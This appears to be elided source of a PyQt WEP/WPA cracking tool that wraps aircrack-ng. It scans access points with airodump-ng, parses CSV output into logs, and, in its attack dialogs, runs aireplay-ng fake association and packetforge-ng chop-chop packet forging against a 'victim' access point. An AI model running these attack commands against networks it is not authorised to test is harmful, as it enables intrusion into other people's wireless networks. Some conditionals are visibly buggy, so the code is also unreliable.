...
def client_update():
    ...
    try:
        ...
        pass
    try:
        client2 = wpa_clients_list.index(mac_address) - 5
        client2_calc = wpa_clients_list[client2]
        client_list.append(client2_calc)
        wpa_clients_list.pop(wpa_clients_list.index(mac_address))
    except (IndexError,ValueError):
        pass
    try:
        client3 = wpa_clients_list.index(mac_address) - 5
        client3_calc = wpa_clients_list[client3]
        client_list.append(client3_calc)
        wpa_clients_list.pop(wpa_clients_list.index(mac_address))
    except (IndexError,ValueError):
        pass
    try:
        client4 = wpa_clients_list.index(mac_address) - 5
        client4_calc = wpa_clients_list[client4]
        client_list.append(client4_calc)
        wpa_clients_list.pop(wpa_clients_list.index(mac_address))
    except (IndexError,ValueError):
        pass
    try:
        client5 = wpa_clients_list.index(mac_address) - 5
        client5_calc = wpa_clients_list[client5]
        client_list.append(client5_calc)
        wpa_clients_list.pop(wpa_clients_list.index(mac_address))
    except (IndexError,ValueError):
        pass
    try:
        client6 = wpa_clients_list.index(mac_address) - 5
        client6_calc = wpa_clients_list[client6]
        client_list.append(client6_calc)
        wpa_clients_list.pop(wpa_clients_list.index(mac_address))
    except (IndexError,ValueError):
        pass
    try:
        client7 = wpa_clients_list.index(mac_address) - 5
        client7_calc = wpa_clients_list[client7]
        client_list.append(client7_calc)
        wpa_clients_list.pop(wpa_clients_list.index(mac_address))
    except (IndexError,ValueError):
        pass
    try:
        client8 = wpa_clients_list.index(mac_address) - 5
        client8_calc = wpa_clients_list[client8]
        client_list.append(client8_calc)
        wpa_clients_list.pop(wpa_clients_list.index(mac_address))
    except (IndexError,ValueError):
        pass
    try:
        client9 =wpa_clients_list .index(wpa_victim_mac_address) - 5
        client9_calc = wpa_clients_list[client9]
        client_list.append(client9_calc)
        wpa_clients_list.pop(wpa_clients_list.index(mac_address))
    except (IndexError,ValueError):
        pass
    try:
        client10 = wpa_clients_list.index(mac_address) - 5
        client10_calc = wpa_clients_list[client10]
        client_list.append(client10_calc)
        wpa_clients_list.pop(wpa_clients_list.index(mac_address))
    except (IndexError,ValueError):
        pass
...
class mainwindow(QtGui.QDialog,Ui_Dialog):
	...
	commands.getstatusoutput('killall airmon-ng')
        ...
        inter = interfaces.splitlines(12)
	try:
            try:
                if bool(inter[0]) == True:
                    monitor1 = inter[0]
            except IndexError:monitor1 = ''
            try:
                if bool(inter[1]) == True:
                    monitor2 = inter[1]
            except IndexError:monitor2 = ''
            try:
                if bool(inter[2]) == True:
                    monitor3 = inter[2]
            except IndexError:monitor3 = ''
            try:
                if bool(inter[3]) == True:
                    monitor4 = inter[3]
            except IndexError:monitor4 = ''
            try:
                if bool(inter[4]) == True:
                    monitor5 = inter[4]
            except IndexError:monitor5 = ''
            try:
                if bool(inter[5]) == True:
                    monitor6 = inter[5]
            except IndexError:monitor6 = ''
            try:
                if bool(inter[6]) == True:
                    monitor7 = inter[6]
            except IndexError:monitor7 = ''

            list_.append(monitor1[0:6].strip('\t\t'))        
            if monitor2[0:6].strip('\t\t') == 'mon0' or '':
                pass
            else:
                list_.append(monitor2[0:6].strip('\t\t'))
            if monitor3[0:6].strip('\t\t') == 'mon1'or '':
                pass
            else:
                list_.append(monitor3[0:6].strip('\t\t'))
            if monitor4[0:6].strip('\t\t') == 'mon2' or '':
                pass
            else:
                list_.append(monitor4[0:6].strip('\t\t'))
            if monitor5[0:6].strip('\t\t') == 'mon3' or '':
                pass
            else:
                list_.append(monitor5[0:6].strip('\t\t'))
            if monitor6[0:6].strip('\t\t') == 'mon4' or '':
                pass
            else:
                list_.append(monitor6[0:6].strip('\t\t'))
            if monitor7[0:6].strip('\t\t') == 'mon5' or '':
                pass
            else:
                list_.append(monitor7[0:6].strip('\t\t'))
    ...
    def scan_process1_thread(self,arg,arg1):
        ...
        commands.getstatusoutput("airodump-ng --write /tmp/fern-log/zfern-wep --output-format csv  --encrypt wep %s"%(monitor))          #FOR WEP
        
    def scan_process1_thread1(self,arg,arg1):
        monitor = str(reader('/tmp/fern-log/monitor.log'))
        commands.getstatusoutput("airodump-ng --write /tmp/fern-log/WPA/zfern-wpa --output-format csv  --encrypt wpa %s"%(monitor))      # FOR WPA
    ###################
    def scan_process2_thread(self,arg,arg1):
        ...
        if 'xterm-settings.log' in os.listdir('/tmp/fern-log'):
            ...
            xterm = ''
        commands.getstatusoutput("%s 'airodump-ng --write /tmp/fern-log/zfern-wep --output-format csv  --encrypt wep %s'"%(xterm,monitor))      #FOR WEP
    ...
    def scan_process2_thread1(self,arg,arg1):
        ...
        if 'xterm-settings.log' in os.listdir('/tmp/fern-log'):
            ...
            xterm = ''
        commands.getstatusoutput("%s 'airodump-ng --write /tmp/fern-log/WPA/zfern-wpa --output-format csv  --encrypt wpa %s'"%(xterm,monitor))  # FOR WPA
    ###########################
    def scan_process3_thread(self,arg,arg1):
        ...
        if 'xterm-settings.log' in os.listdir('/tmp/fern-log'):
            ...
            xterm = ''
        commands.getstatusoutput("airodump-ng --channel %s --write /tmp/fern-log/zfern-wep --output-format csv  --encrypt wep %s"%(channel,monitor))    #FOR WEP
    ...
    def scan_process3_thread1(self,arg,arg1):
        ...
        if 'xterm-settings.log' in os.listdir('/tmp/fern-log'):
            ...
            xterm = ''    
        commands.getstatusoutput("airodump-ng --channel %s --write /tmp/fern-log/WPA/zfern-wpa --output-format csv  --encrypt wpa %s"%(channel,monitor))# FOR WPA
    ...
    def scan_process4_thread(self,arg,arg1):
        ...
        if 'xterm-settings.log' in os.listdir('/tmp/fern-log'):
            ...
            xterm = ''
        commands.getstatusoutput("%s 'airodump-ng --channel %s --write /tmp/fern-log/zfern-wep --output-format csv  --encrypt wep %s'"%(xterm,channel,monitor))# FOR WEP
    ...
    def scan_process4_thread1(self,arg,arg1):
        ...
        if 'xterm-settings.log' in os.listdir('/tmp/fern-log'):
            ...
            xterm = ''        
        commands.getstatusoutput("%s 'airodump-ng --channel %s --write /tmp/fern-log/WPA/zfern-wpa --output-format csv  --encrypt wpa %s'"%(xterm,channel,monitor))        
    ...
    def scan_wep(self,arg,arg2):
        ...
        time.sleep(5)
        # Arrange Items to extract real wep csv file
        arrange = os.listdir('/tmp/fern-log')       # WEP Alignment
        arrange.sort()
        wep_csv = arrange[-1]

        arrange2 = os.listdir('/tmp/fern-log/WPA')  # WPA Alignment
        arrange2.sort()
        wpa_csv = arrange2[-1]
        ...
        while 5 != 1:
            time.sleep(2)
            wep_access_file = str(reader('/tmp/fern-log/%s'%(wep_csv)))         # WEP access point log file
            wpa_access_file = str(reader('/tmp/fern-log/WPA/%s'%(wpa_csv)))     # WPA access point log file
            ...
            wep_access_convert = wep_access_file.replace(',','\n')
            wep_access_split = wep_access_convert.splitlines()
            try:
                wep_access_filter = wep_access_split.index('Station MAC')
            except ValueError:
                pass
            try:
                wep_access = wep_access_split[0:wep_access_filter]
            except UnboundLocalError:
                pass

            if 'wep_details.log' not in os.listdir('/tmp/fern-log/'):
                write('/tmp/fern-log/wep_details.log','')
            else:
                try:
                    remove('/tmp/fern-log','wep_details.log')
                    write('/tmp/fern-log/wep_details.log','')
                except IOError:
                    pass

            # Write wep_access points details to the file - (Only 10 WEP access points are allowed)
            #1
            try:
                write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[16].strip(' ')))      # Access point Mac-address	+15
            except (IndexError,UnboundLocalError):pass
            try:
                write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[19].strip(' ')))      # Access point channel		+3
            except (IndexError,UnboundLocalError):pass
            try:
                write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[20].strip(' ')))      # Access point speed		+1
            except (IndexError,UnboundLocalError):pass
            try:
                write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[24].strip(' ')))      # Access point power		+4
            except (IndexError,UnboundLocalError):pass
            try:
                write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[29].strip(' ')))      # Access point Name		+5
            except (IndexError,UnboundLocalError):pass
            ...
            #2
            try:
                if wep_access[34].strip(' ') == 'Last time seen':
                    pass
                else:
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[31].strip(' ')))      # Access point Mac-address
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[34].strip(' ')))      # Access point channel
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[35].strip(' ')))      # Access point speed
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[39].strip(' ')))      # Access point power
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[44].strip(' ')))      # Access point Name
                    except (IndexError,UnboundLocalError):pass
            ...
            #3
            try:
                if wep_access[49].strip(' ') == 'Last time seen':
                    pass
                else:
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[46].strip(' ')))      # Access point Mac-address
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[49].strip(' ')))      # Access point channel
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[50].strip(' ')))      # Access point speed
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[54].strip(' ')))      # Access point power
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[59].strip(' ')))      # Access point Name
                    except (IndexError,UnboundLocalError):pass
            ...
            #4
            try:
                if wep_access[64].strip(' ') == 'Last time seen':
                    pass
                else:
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[61].strip(' ')))      # Access point Mac-address
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[64].strip(' ')))      # Access point channel
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[65].strip(' ')))      # Access point speed
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[69].strip(' ')))      # Access point power
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[74].strip(' ')))      # Access point Name
                    except (IndexError,UnboundLocalError):pass
            ...
            #5
            try:
                if wep_access[79].strip(' ') == 'Last time seen':
                    pass
                else:
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[76].strip(' ')))      # Access point Mac-address
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[79].strip(' ')))      # Access point channel
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[80].strip(' ')))      # Access point speed
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[84].strip(' ')))      # Access point power
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[89].strip(' ')))      # Access point Name
                    except (IndexError,UnboundLocalError):pass
            ...
            #6
            try:
                if wep_access[94].strip(' ') == 'Last time seen':
                    pass
                else:
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[91].strip(' ')))      # Access point Mac-address
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[94].strip(' ')))      # Access point channel
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[95].strip(' ')))      # Access point speed
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[99].strip(' ')))      # Access point power
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[104].strip(' ')))      # Access point Name
                    except (IndexError,UnboundLocalError):pass
            ...
            #7
            try:
                if wep_access[109].strip(' ') == 'Last time seen':
                    pass
                else:
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[106].strip(' ')))      # Access point Mac-address
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[109].strip(' ')))      # Access point channel
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[110].strip(' ')))      # Access point speed
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[114].strip(' ')))      # Access point power
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[119].strip(' ')))      # Access point Name
                    except (IndexError,UnboundLocalError):pass
            ...
            #8
            try:
                if wep_access[124].strip(' ') == 'Last time seen':
                    pass
                else:
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[121].strip(' ')))      # Access point Mac-address
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[124].strip(' ')))      # Access point channel
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[125].strip(' ')))      # Access point speed
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[129].strip(' ')))      # Access point power
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[134].strip(' ')))      # Access point Name
                    except (IndexError,UnboundLocalError):pass
            ...
            #9
            try:
                if wep_access[139].strip(' ') == 'Last time seen':
                    pass
                else:
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[136].strip(' ')))      # Access point Mac-address
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[139].strip(' ')))      # Access point channel
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[140].strip(' ')))      # Access point speed
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[144].strip(' ')))      # Access point power
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[149].strip(' ')))      # Access point Name
                    except (IndexError,UnboundLocalError):pass
            ...
            #10
            try:
                if wep_access[154].strip(' ') == 'Last time seen':
                    pass
                else:
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[151].strip(' ')))      # Access point Mac-address
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[154].strip(' ')))      # Access point channel
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[155].strip(' ')))      # Access point speed
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[159].strip(' ')))      # Access point power
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[164].strip(' ')))      # Access point Name
                    except (IndexError,UnboundLocalError):pass
            ...
            read_wpa = reader('/tmp/fern-log/WPA/%s'%(wpa_csv))
            number_access = str(wpa_access_file.count('WPA'))        # number of access points wep detected
            try:
                remove('/tmp/fern-log/WPA','number.log')
            except IOError:
                pass
            write('/tmp/fern-log/WPA/number.log','%s'%(number_access))
            if 'WPA' or 'WPA2' in read_wpa:
		if int(number_access) > 0:
            ...
            wpa_access_convert = wpa_access_file.replace(',','\n')
            wpa_access_split = wpa_access_convert.splitlines()
            try:
                wpa_access_filter = wpa_access_split.index('Station MAC')
            except ValueError:
                pass
            try:
                wpa_access = wpa_access_split[0:wpa_access_filter]
            except UnboundLocalError:
                pass


            if 'wpa_details.log' not in os.listdir('/tmp/fern-log/WPA'):
                write('/tmp/fern-log/WPA/wpa_details.log','')
            else:
                remove('/tmp/fern-log/WPA','wpa_details.log')
		write('/tmp/fern-log/WPA/wpa_details.log','')

            # Write wpa_access point details to the file - (Only 10 WPA access points are allowed)
            #1
            try:
                write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[16].strip(' ')))      # Access point Mac-address		+15
            except (IndexError,UnboundLocalError):pass
            try:
                write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[19].strip(' ')))      # Access point channel		+3
            except (IndexError,UnboundLocalError):pass
            try:
                write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[20].strip(' ')))      # Access point speed		+1
            except (IndexError,UnboundLocalError):pass
            try:
                write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[24].strip(' ')))      # Access point power		+4
            except (IndexError,UnboundLocalError):pass
            try:
                write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[29].strip(' ')))      # Access point Name			+5
            except (IndexError,UnboundLocalError):pass
            ...
            #2
            try:
                if wpa_access[34].strip(' ') == 'Last time seen':
                    pass
                else:
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[31].strip(' ')))      # Access point Mac-address
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[34].strip(' ')))      # Access point channel
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[35].strip(' ')))      # Access point speed
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[39].strip(' ')))      # Access point power
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[44].strip(' ')))      # Access point Name
                    except (IndexError,UnboundLocalError):pass
            ...
            #3
            try:
                if wpa_access[49].strip(' ') == 'Last time seen':
                    pass
                else:
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[46].strip(' ')))      # Access point Mac-address
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[49].strip(' ')))      # Access point channel
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[50].strip(' ')))      # Access point speed
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[54].strip(' ')))      # Access point power
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[59].strip(' ')))      # Access point Name
                    except (IndexError,UnboundLocalError):pass
            ...
            #4
            try:
                if wpa_access[64].strip(' ') == 'Last time seen':
                    pass
                else:
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[61].strip(' ')))      # Access point Mac-address
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[64].strip(' ')))      # Access point channel
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[65].strip(' ')))      # Access point speed
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[69].strip(' ')))      # Access point power
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[74].strip(' ')))      # Access point Name
                    except (IndexError,UnboundLocalError):pass
            ...
            #5
            try:
                if wpa_access[79].strip(' ') == 'Last time seen':
                    pass
                else:
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[76].strip(' ')))      # Access point Mac-address
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[79].strip(' ')))      # Access point channel
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[80].strip(' ')))      # Access point speed
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[84].strip(' ')))      # Access point power
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[89].strip(' ')))      # Access point Name
                    except (IndexError,UnboundLocalError):pass
            ...
            #6
            try:
                if wpa_access[94].strip(' ') == 'Last time seen':
                    pass
                else:
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[91].strip(' ')))      # Access point Mac-address
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[94].strip(' ')))      # Access point channel
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[95].strip(' ')))      # Access point speed
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[99].strip(' ')))      # Access point power
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[104].strip(' ')))      # Access point Name
                    except (IndexError,UnboundLocalError):pass
            ...
            #7
            try:
                if wpa_access[109].strip(' ') == 'Last time seen':
                    pass
                else:
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[106].strip(' ')))      # Access point Mac-address
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[109].strip(' ')))      # Access point channel
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[110].strip(' ')))      # Access point speed
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[114].strip(' ')))      # Access point power
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[119].strip(' ')))      # Access point Name
                    except (IndexError,UnboundLocalError):pass
            ...
            #8
            try:
                if wpa_access[124].strip(' ') == 'Last time seen':
                    pass
                else:
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[121].strip(' ')))      # Access point Mac-address
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[124].strip(' ')))      # Access point channel
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[125].strip(' ')))      # Access point speed
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[129].strip(' ')))      # Access point power
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[134].strip(' ')))      # Access point Name
                    except (IndexError,UnboundLocalError):pass
            ...
            #9
            try:
                if wpa_access[139].strip(' ') == 'Last time seen':
                    pass
                else:
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[136].strip(' ')))      # Access point Mac-address
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[139].strip(' ')))      # Access point channel
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[140].strip(' ')))      # Access point speed
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[144].strip(' ')))      # Access point power
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[149].strip(' ')))      # Access point Name
                    except (IndexError,UnboundLocalError):pass
            ...
            #10
            try:
                if wpa_access[154].strip(' ') == 'Last time seen':
                    pass
                else:
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[151].strip(' ')))      # Access point Mac-address
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[154].strip(' ')))      # Access point channel
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[155].strip(' ')))      # Access point speed
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[159].strip(' ')))      # Access point power
                    except (IndexError,UnboundLocalError):pass
                    try:
                        write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[164].strip(' ')))      # Access point Name
                    except (IndexError,UnboundLocalError):pass
...
class wep_attack_dialog(QtGui.QDialog,wep_window):
    def __init__(self):
        ...
        self.connect(self,QtCore.SIGNAL("next_try"),self.next_try)
        ...
        list_ = []
        try:
            list_.append(combo_list[4])
        except IndexError:pass
        try:
            list_.append(combo_list[9])
        except IndexError:pass
        try:
            list_.append(combo_list[14])
        except IndexError:pass
        try:
            list_.append(combo_list[19])
        except IndexError:pass
        try:
            list_.append(combo_list[24])
        except IndexError:pass
        try:
            list_.append(combo_list[29])
        except IndexError:pass
        try:
            list_.append(combo_list[34])
        except IndexError:pass
        try:
            list_.append(combo_list[39])
        except IndexError:pass
        try:
            list_.append(combo_list[44])
        except IndexError:pass
        try:
            list_.append(combo_list[49])
        except IndexError:pass
    ...
    def association_thread(self,arg,arg1):
        ...
        while 'Association successful :-)' not in read:
            read += str(commands.getstatusoutput('aireplay-ng -1 0 -a %s -h %s %s'%(victim_mac,attacker_mac_address,monitor)))
    ...
    def chop_chop_thread(self,arg,arg1):
        ...
        commands.getstatusoutput('cd /tmp/fern-log/WEP-DUMP/ \n packetforge-ng -0 -a %s -h %s -k 255.255.255.255 -l 255.255.255.255 -y /tmp/fern-log/WEP-DUMP/*.xor -w /tmp/fern-log/WEP-DUMP/chop_chop.cap'%(access_point_mac,attacker_mac_address))
...
class wpa_attack_dialog(QtGui.QDialog,wpa_window):
    ...
    def selected_wpa_access(self):
        ...
        global client_list
        client_list = []
        self.emit(QtCore.SIGNAL("clear combo"))
